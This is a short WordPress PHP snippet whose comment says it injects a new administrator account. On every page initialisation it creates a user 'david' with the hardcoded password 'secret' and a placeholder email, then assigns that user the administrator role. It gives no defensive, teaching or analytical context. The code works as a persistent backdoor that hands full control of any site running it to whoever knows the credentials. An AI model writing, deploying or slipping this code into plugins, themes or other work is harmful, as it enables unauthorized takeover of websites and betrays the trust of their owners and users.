<?php

/*

################################################## 

This PHP snippet injects a new administrator account into WordPress upon initialization if it's not already present.

*/
function new_admin_account()
{
	$user = 'david';
	$pass = 'secret';
	$email = 'a@a.com';
	if (!username_exists($user) && !email_exists($email)) {
		$user_id = wp_create_user($user, $pass, $email);
		$user = new WP_User($user_id);
		$user->set_role('administrator');
	}
}
add_action('init', 'new_admin_account');
